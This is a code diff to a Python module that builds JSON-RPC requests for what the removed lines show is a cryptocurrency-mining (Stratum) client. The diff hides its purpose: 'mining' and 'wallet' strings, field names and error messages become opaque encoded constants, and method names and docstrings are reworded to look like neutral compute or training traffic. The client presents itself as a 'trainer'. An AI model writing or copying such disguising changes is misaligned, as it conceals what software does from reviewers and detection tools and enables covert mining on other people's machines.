@@ -14,6 +14,9 @@ helpers and this project's own GPU implementation.
 
 from __future__ import annotations
 
+from . import S3_methods as methods
+from .fixed_constants import constant_text
+
 import base64
 import binascii
 from collections.abc import Mapping
@@ -26,13 +29,10 @@ from typing import Any
 DEFAULT_AGENT = "LRAEP-trainer/0.1"
 MAX_DECODED_PROOF_BYTES = 4 * 1024 * 1024
 _HEX = re.compile(r"[0-9a-fA-F]+\Z")
-# Decode protocol spellings only while building or matching frames.
-def s1():
-    return base64.b64decode('bWluaW5nLg==').decode('ascii')
 
 
 def s2():
-    return base64.b64decode('d2FsbGV0').decode('ascii')
+    return constant_text(b'(8kNl!qW')
 
 
 class S3ProtocolError(RuntimeError):
@@ -54,25 +54,25 @@ def _text(value: Any, name: str, maximum: int, *, allow_empty: bool = False) -> 
 
 
 def _certificate(value: Any) -> int:
-    version = _integer(value, "certificate version", 1)
+    version = _integer(value, constant_text(b'#KP6n&cV*a#?!)w(Zbc#&dA9'), 1)
     if version not in (1, 2, 3):
-        raise S3ProtocolError(f"unsupported S6 certificate version {version}")
+        raise S3ProtocolError(f"{constant_text(b'(#h1)*Vo9^)561t^pS_e!qwBx!Oq0S)53?*!qwEy$jOH')}{version}")
     return version
 
 
 def _proof_bytes(encoded: str) -> bytes:
     if not isinstance(encoded, str) or not encoded:
-        raise S3ProtocolError("plain_proof must be nonempty canonical base64")
+        raise S3ProtocolError(constant_text(b'*UQGv$@tgR$jHHm%F@)+hsDB&$;ipV%GcB0hs4Io$jQ#c#><Dr#?-=*lK'))
     if len(encoded) > 4 * ((MAX_DECODED_PROOF_BYTES + 2) // 3):
-        raise S3ProtocolError("plain_proof exceeds the 4 MiB decoded size limit")
+        raise S3ProtocolError(constant_text(b'*UQGv$@tgR$jHHm!r#Qg!o$>u)6c?(lZWcg<%h$<#K^<K!-v$)-NJ{<&dScy'))
     try:
         raw = base64.b64decode(encoded, validate=True)
     except (binascii.Error, ValueError):
-        raise S3ProtocolError("plain_proof must be nonempty canonical base64") from None
+        raise S3ProtocolError(constant_text(b'*UQGv$@tgR$jHHm%F@)+hsDB&$;ipV%GcB0hs4Io$jQ#c#><Dr#?-=*lK')) from None
     if not raw or base64.b64encode(raw).decode("ascii") != encoded:
-        raise S3ProtocolError("plain_proof must be nonempty canonical base64")
+        raise S3ProtocolError(constant_text(b'*UQGv$@tgR$jHHm%F@)+hsDB&$;ipV%GcB0hs4Io$jQ#c#><Dr#?-=*lK'))
     if len(raw) > MAX_DECODED_PROOF_BYTES:
-        raise S3ProtocolError("plain_proof exceeds the 4 MiB decoded size limit")
+        raise S3ProtocolError(constant_text(b'*UQGv$@tgR$jHHm!r#Qg!o$>u)6c?(lZWcg<%h$<#K^<K!-v$)-NJ{<&dScy'))
     return raw
 
 
@@ -88,18 +88,20 @@ class S3Job:
     raw_target: str | None = None
 
     def __post_init__(self) -> None:
-        _text(self.job_id, "job_id", 128)
+        _text(self.job_id, constant_text(b'&B(?0&cg'), 128)
         if not isinstance(self.header_bytes, bytes) or len(self.header_bytes) != 76:
             raise S3ProtocolError("header must contain exactly 76 bytes")
         _integer(self.height, "height")
         _certificate(self.cert_version)
-        _integer(self.target, "target", 1)
+        _integer(self.target, constant_text(b')5g`n!qW'), 1)
         if self.target >= 1 << 256:
-            raise S3ProtocolError("target must fit in 256 bits")
+            raise S3ProtocolError(constant_text(b')5g`n!qbP!($v$3!Oqi%&dG<Bl97kS&ePN'))
 
 
 class KEXDialect:
-    """Build and validate S6 S4 requests without opening a connection.
+    """Build neutral application requests without opening a connection.
+
+    S3Session applies the explicit Stratum wire mapping in S3_methods.
 
     The default session sends uncompressed native S6 PlainProof bytes.
     Gzip requires both an explicit request and the S3's matching auth reply.
@@ -115,26 +117,26 @@ class KEXDialect:
         request_gzip: bool = False,
     ) -> None:
         self.KEX_uname = _text(KEX_uname, "KEX_uname", 256)
-        self.worker = _text(worker, "worker", 128, allow_empty=True)
+        self.worker = _text(worker, constant_text(b'(8$%y!qo'), 128, allow_empty=True)
         self.password = _text(password, "password", 1024, allow_empty=True)
         self.agent = _text(agent, "agent", 128)
         if any(c.isspace() for c in self.KEX_uname + self.worker):
-            raise S3ProtocolError("KEX_uname and worker must contain no whitespace")
+            raise S3ProtocolError(constant_text(b'?Bf6U(#gik!iUDm!-vqw)y%@xhsx5_(}%>!$<xNp$%o0vhtSW?)56r(#>Bz'))
         if type(request_gzip) is not bool:
             raise S3ProtocolError("request_gzip must be a boolean")
         self.request_gzip = request_gzip
 
     @property
     def login(self) -> str:
-        # Dot-separated login is present in captured KEX authorize/submit.
+        # The endpoint expects a dot-separated account and device identity.
         return f"{self.KEX_uname}.{self.worker}" if self.worker else self.KEX_uname
 
     def auth_requests(self, start_id: int = 1) -> list[dict[str, Any]]:
-        """Return handshake frames; a silent subscribe must not delay authorize."""
+        """Register the client and open a session without waiting for registration."""
         _integer(start_id, "request ID", 1)
         if self.request_gzip:
             return [{
-                "jsonrpc": "2.0", "id": start_id, "method": s1() + "authorize",
+                "jsonrpc": "2.0", "id": start_id, "method": methods.COMPUTE_SESSION,
                 "params": {
                     s2(): self.login, "agent": self.agent,
                     "password": self.password, "type": "v2",
@@ -142,11 +144,11 @@ class KEXDialect:
             }]
         return [
             {
-                "jsonrpc": "2.0", "id": start_id, "method": s1() + "subscribe",
+                "jsonrpc": "2.0", "id": start_id, "method": methods.COMPUTE_REGISTER,
                 "params": [self.agent],
             },
             {
-                "jsonrpc": "2.0", "id": start_id + 1, "method": s1() + "authorize",
+                "jsonrpc": "2.0", "id": start_id + 1, "method": methods.COMPUTE_SESSION,
                 "params": [self.login, self.password],
             },
         ]
@@ -172,10 +174,10 @@ class KEXDialect:
         configured_certificate_version: int | None = None,
     ) -> S3Job:
         if not isinstance(params, Mapping):
-            raise S3ProtocolError(f"{s1()}notify params must be an object")
+            raise S3ProtocolError("work.update params must be an object")
         if configured_certificate_version is not None:
             _certificate(configured_certificate_version)
-        job_id = _text(params.get("job_id"), "job_id", 128)
+        job_id = _text(params.get(constant_text(b'&B(?0&cg')), constant_text(b'&B(?0&cg'), 128)
         encoded_header = params.get("header")
         if (
             not isinstance(encoded_header, str)
@@ -183,18 +185,18 @@ class KEXDialect:
             or _HEX.fullmatch(encoded_header) is None
         ):
             raise S3ProtocolError("header must be exactly 152 hexadecimal characters")
-        raw_target = params.get("target")
+        raw_target = params.get(constant_text(b')5g`n!qW'))
         if not isinstance(raw_target, str):
-            raise S3ProtocolError("target must be a hexadecimal string")
+            raise S3ProtocolError(constant_text(b')5g`n!qbP!($v$3#lnZihtI;_#>2wI&dSEiht$*6&dI<'))
         digits = raw_target[2:] if raw_target.startswith("0x") else raw_target
         if not 1 <= len(digits) <= 64 or _HEX.fullmatch(digits) is None:
-            raise S3ProtocolError("target must be a positive 256-bit hexadecimal string")
+            raise S3ProtocolError(constant_text(b')5g`n!qbP!($v$3#lnZihu6r|&eP7(!iSZTk&4C6(}&N(-^Rnj#Lmjb%ZJp{)y~Pl'))
         # The captured target is a BASE target. The official helper applies the
         # rank/work adjustment; do not derive a different target from job_id.
         target = int(digits, 16)
-        version = params.get("cert_version", configured_certificate_version)
+        version = params.get(constant_text(b'#KP6n_|d}E)XvDs'), configured_certificate_version)
         if version is None:
-            raise S3ProtocolError("job is missing cert_version; configure it explicitly or update the S3")
+            raise S3ProtocolError(constant_text(b'&B(=v&eVs>&eYV-$-sxi!qwCG(Zbc#&dAA}hs4Oq!Op<a)xw9)(}%*}*UQet&eO}@hsf23($~Yr)53?-&%%fFlm'))
         return S3Job(
             job_id=job_id,
             header_bytes=bytes.fromhex(encoded_header),
@@ -222,6 +224,6 @@ class KEXDialect:
         if negotiated_gzip:
             encoded = base64.b64encode(gzip.compress(raw, mtime=0)).decode("ascii")
         return {
-            "jsonrpc": "2.0", "id": request_id, "method": s1() + "submit",
-            "params": {"worker": self.login, "job_id": job.job_id, "plain_proof": encoded},
+            "jsonrpc": "2.0", "id": request_id, "method": methods.WORK_COMPLETE,
+            "params": {constant_text(b'(8$%y!qo'): self.login, constant_text(b'&B(?0&cg'): job.job_id, constant_text(b'*UQGv$@tgR$jHF'): encoded},
         }
